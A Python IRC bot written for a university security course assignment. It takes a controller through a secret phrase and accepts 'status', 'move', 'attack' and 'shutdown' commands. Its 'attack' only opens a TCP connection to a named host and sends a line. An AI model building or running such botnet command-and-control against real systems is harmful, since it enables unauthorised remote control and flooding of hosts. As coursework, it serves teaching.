"""
bot.py
IRC bot

Written by Neil Hagstrom and Christopher Neave.
Created for CPSC 526 at the University of Calgary
"""
import argparse
import socket
import time
import socket

#start initial connection
def connect(name, args):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(1)
    while (checkNick(sock)):
        name = name[0]+name[1]+name[2]+name[3]+chr(ord(name[4])+1)
        sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(None)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(args.channel).encode("utf-8"))
    return sock, name

#reconnect when disconnected
def reconnect(name, cc, ch, cp):
    sock = socket.socket()
    sock.connect((ch, int(cp)))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(1)
    while (checkNick(sock)):
        name = name[0]+name[1]+name[2]+name[3]+chr(ord(name[4])+1)
        sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(None)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(cc).encode("utf-8"))
    return sock, name

#Ensures a valid port is given to the program
def port_type(x):
    x = int(x)
    if x not in range(1,65535):
        raise argparse.ArgumentTypeError("Port must be integers in the range 1-65535")
    return x 

#initialize command line arguments    
def parseArgs():
    #Set up the required arguements
    parser = argparse.ArgumentParser(description = "Bot for CPSC526 Assignment 5")
    parser.add_argument("hostname", type = str, help="The target for the bot to connect to")
    parser.add_argument("port", type = port_type, help="The target port for the bot to connect to")
    parser.add_argument("channel", type=str,help="The IRC channel to join")
    parser.add_argument("secret", type=str, help="The secret phrase to listen for")
    args = parser.parse_args()
    return args

def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        arg = s.split()
        arg.append(trailing)
    else:
        arg = s.split()
    command = arg.pop(0)
    return prefix, command, arg

#printing the messages broken up for debugging
def debugPrint(prefix, command, arg):
    print("prefix: " + prefix)
    print("command: " + command)
    i = 0 
    for p in arg: 
        print ("arg[",i,"] = ",p.replace("\n", "").replace("\r", ""))
        i += 1

#used to send message to a channel
def chat(sock, channel,  msg):
    """
    Send a chat message to the server.
    Keyword arguments:
    sock -- the socket over which to send the message
    channel  -- the channel to be sent to
    msg  -- the message to be sent
    """
    sock.send(("PRIVMSG #{} :{}\r\n".format(channel, msg)).encode("utf-8"))
    print("\n\n\t\t PRIVMSG #{} :{}".format(channel, msg))

#used to send message to a user
def chatPriv(sock, user,  msg):
    """
    Send a chat message to the server.
    Keyword arguments:
    sock -- the socket over which to send the message
    channel  -- the channel to be sent to
    msg  -- the message to be sent
    """
    sock.send(("PRIVMSG {} :{}\r\n".format(user, msg)).encode("utf-8"))
    print("\n\n\t\t PRIVMSG #{} :{}".format(user, msg))

#checking if the nickname is taken already on the server
def checkNick(sock):
    sock.settimeout(0.5)
    try:
        #see if response is ping
        response = sock.recv(1024).decode("utf-8")
        if response.find ( 'PING' ) != -1:
            sock.send ( 'PONG ' + response.split() [ 1 ] + '\r\n' )
            checkNick(sock)
        #see if response is command 433 which is nick taken
        else:
            (prefix, command, arg) = parsemsg(response)
            if (command=="433"):
                return True
    except:
        print("Timeout, no response")
    return False   

#move bot to a new irc server and channel
def move(sock, host, port, channel, name):
    sock.close()
    sock2 = socket.socket()
    sock2.connect((host, int(port)))
    sock2.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock2.settimeout(1)
    while (checkNick(sock2)):
        name = name[0]+name[1]+name[2]+name[3]+chr(ord(name[4])+1)
        sock2.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock2.settimeout(None)
    sock2.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock2.send("JOIN #{}\r\n".format(channel).encode("utf-8"))
    return sock2, host, port, channel, name

#attack the specified hostname and port
def attack(host, port, name, attackcounter):
    try:
        attacker = socket.socket()
        attacker.settimeout(.2)
        attacker.connect((host, int(port)))
        attacker.send((name+" " + str(attackcounter)+"\n").encode("utf-8"))
        attacker.close()
        return "Success"
    except socket.error:
        return "Failure"

def main():
    #initialize variables
    name = "bot-1"
    args = parseArgs()
    controller = ""
    currentChannel = args.channel
    currentHost = args.hostname
    currentPort = args.port
    attackCounter = 1
    run = True
    (sock, name) = connect(name, args)
    print("Connected to IRC...")
    print("args.secret = ", args.secret)
    sock.settimeout(None)
    
    #run loop checking for messages in the server
    while run:
        try:
            #respond appropriately to the ping message
            response = sock.recv(1024).decode("utf-8")
            if response.find ( 'PING' ) != -1:
                sock.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
            else:
                (prefix, command, arg)= parsemsg(response)
                debugPrint(prefix, command, arg)
                if command == "PRIVMSG":            
                    #prefchan[0] is nick of who sent the message
                    prefchan = prefix.split("!")
                    #if the arg sent is the passcode set controller to be the nick of who sent it
                    if arg[1].strip() == args.secret:
                        controller = prefchan[0]
                        print("\t\tController is:", controller)
                
                    #send a private message to the controller with your name
                    if prefix.split("!")[0] == controller and arg[1].strip() == "status":
                        chatPriv(sock, controller, name)

                    #send a private message to the controller with your name
                    if prefix.split("!")[0] == controller and arg[1].split()[0] == "move":
                        splitting = arg[1].split()
                        (sock, currentHost, currentPort, currentChannel, name) = move(sock, splitting[1], splitting[2], splitting[3], name)

                    if prefix.split("!")[0] == controller and arg[1].split()[0] == "attack":
                        splitting = arg[1].split()
                        attackSuc = attack(splitting[1], splitting[2], name, attackCounter)
                        attackCounter = attackCounter + 1
                        chatPriv(sock, controller, attackSuc)
                    #send a private message to the controller with text shutdown
                    if prefix.split("!")[0] == controller and arg[1].strip() == "shutdown":
                        chatPriv(sock, controller, "shutdown {}".format(name))
                        run = False
                print("R: ",response)
        except:
            #if disconnected wait 5 seconds and try to reconnect
            while True:
                time.sleep(5)
                try:
                    (sock, name) = reconnect(name, currentChannel, currentHost, currentPort)
                    break
                except socket.error as e:
                    pass

    sock.close()

main()
